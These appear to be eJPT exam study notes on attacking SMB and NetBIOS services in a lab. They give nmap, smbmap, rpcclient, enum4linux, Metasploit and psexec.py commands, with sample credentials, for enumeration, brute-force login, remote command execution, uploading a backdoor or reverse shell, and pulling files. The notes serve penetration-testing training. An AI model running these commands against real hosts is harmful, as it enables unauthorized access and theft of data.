## SMB (Samba) - p445 and NetBios - p137,138,139

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

## SMB - p445

Port 445 handle communication while port 139 handle the connection to the service.
Ports 135, 139 e 445 are very common on Windows systems.
```
net use Z: \\10.10.10.1\C$ smbserver_771 /user:administrator
```
```
net use * /delete
```
These two commands are used in a Windows CLI to mount and dismount network drives thanks to SMB protocol.

Nmap

* smb-protocols
* smb-os-discovery
* smb-security-mode
* smb-enum-sessions
* smb-enum-shares
* smb-enum-shares,smb-ls
* smb-enum-users
* smb-server-stats
* smb-enum-domains
* smb-enum-groups
* smb-enum-services

All these scripts use the same arguments

* smbusername=administrator smbpassword=smbserver_771 


### Discovery general info
```
nmap -p445 --script smb-protocols 10.10.10.1
```
### Discovery security
```
nmap -p445 --script smb-security-mode 10.10.10.1
```
### Discovery open sessions
```
nmap -p445 --script smb-enum-sessions 10.10.10.1
```
```
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
### Discovery shared folders
```
nmap -p445 --script smb-enum-shares 10.10.10.1
```
```
nmap -p445 --script smb-enum-shares 10.10.10.1 --script-args smbusername=administrator,smbpassword=smbserver_771
```
### Discovery users
```
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
### Server Stats
```
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
It is used to obtain server statistics like: failed logins, permission errors, system errors, print job, files opened.

### Discovery domain
```
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
It enumerates domain general information.

### Discovery groups
```
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
### Discovery services
```
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
### Discovery shared folders and their content
```
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.1
```
### Discovery OS via SMB
```
nmap 192.168.1.1 -p 445 --script smb-os-discovery
```

## SMBMap
```
smbmap -u guest -p “” -d . -H 10.10.10.1
```
This command enumerates shared folders, along with their permissions, via the username "guest" and an empty password.
```
smbmap -u administrator -p smbserver_771  -H 10.10.10.1 -x ‘ipconfig’
```
This feature enables the execution of CLI commands via the administrator’s username and password. This vulnerability is classified as Remote code execution (RCE).
```
smbmap -u administrator -p smbserver_771  -H 10.10.10.1 -L
```
This feature lists all available drives on the target machine.
```
smbmap -u administrator -p smbserver_771  -H 10.10.10.1 -r ‘C$’
```
It lists all folders in the main folder.
```
smbmap -u administrator -p smbserver_771  -H 10.10.10.1 —upload ‘/root/backdoor’ ‘C$\backdoor’
```
This command facilitates the uploading of a file to the target machine. For instance, it can be used to upload a reverse shell.
```
smbmap -u administrator -p smbserver_771  -H 10.10.10.1 —download ‘C$\flag.txt’
```
This command is used to download files from the target.


## nmblookup
```
nmblookup -A 10.10.10.1
```
This command analyses what a SMB port can do.


## smbclient
```
smbclient -L 192.168.1.1 -N
```
It connects to a NULL session and list all shared folders.
```
smbclient //10.10.10.1/shawn -U admin
```
It connects to a SMB sessions using "admin" as username.


## rpcclient

As IPC$ appears in the resulting list during an enumeration, it may be interesting to attempt connecting as a NULL session.
```
rpcclient -U “” -N 192.168.1.1
```
* srvinfo: show server information including OS version among all other information
* enumdomusers: lists domain users
* enumdomgroups: lists domain groups
* lookupnames: converts usernames to SID
* querydominfo: returns domain informations
* queryuser: returns information about a user like SID, privileges, etc
* querygroup: returns information about a group like SID, privileges, members, etc
* getdompwinfo: returns information about domain passwords
* getuserinfo: returns detailed user information
* getgroupmembership: returns the group associated with the user
* netshareenum: lists available shares
* netsharegetinfo: returns information about a specific share
* netshareenumall: returns information about share and devices
* netsharecheck: check for availability of a single share
* netrpctrace: trace all RPC call between the target and the host
* netdomenum: lists all domain resources, like domain controllers.


## enum4linux
```
enum4linux -o 192.168.1.1

enum4linux -U 192.168.1.1  - lists users

enum4linux -S 192.168.1.1  - lists shares

enum4linux -G 192.168.1.1 - lists group

enum4linux -i 192.168.1.1 - lists printers

enum4linux -r -u “admin” -p “password1” 192.168.1.1 - lists all SID on the target machine
```

## SMBClient
```
smbclient -L \\\\10.10.10.1\\ -U admin
smbclient \\\\10.10.10.1\\public -U admin
```

## Exploiting SMB with PsExec

PsExec is like Telnet but only works with the SMB protocol, returning a CLI on the target system.

### Using Metasploit
```
use auxiliary/scanner/smb/smb_login
```
Used for brute-forcing into the SMB protocol or simply to log in and generate a session to be used with other modules. PSExec is one of these modules that allows us to obtain a Meterpreter session.
```
use exploit/windows/smb/psexec
```
These are other modules to be used in enumeration of SMB Protocol.
```
search type:auxiliary name:smb_version
search type:auxiliary name:smb_enumusers
search type:auxiliary name:smb_enumshares
set showfiles true
search type:auxiliary name:smb_login
```

### Using Python
```
psexec.py Administrator@10.10.10.1 cmd.exe
```
With this command, we can obtain a CLI on the target system in a silent way than Metasploit because we are not uploading anything to the target machine.


## Linux Exploiting SAMBA

Samba v3.5.0 is vulnerable to remote code execution.
```
use exploit/linux/samba/is_known_pipename
```

## NetBIOS - p137,138,139

This service usually comes with SMB, but it is used as:
* Name Service (NetBIOS-NS): allows computer to register, unregistered and resolve names in a local network.
* Datagram service (NetBIOS-DGM): supports connectionless communication and broadcasting.
* Session Service (NetBIOS-SSN): supports connection-oriented communication for more reliable data transfers

### NBTScan
```
nbtscan 10.10.4.0/24 - scan local network for NetBIOS services
```
### Nmap
```
nmap -sU -p 137 demo.ine.local - scan the target searching for NetBIOS service
```
```
nmap -sU -sV -T4 —script nbstat -p 137 -Pn demo.ine.local
```
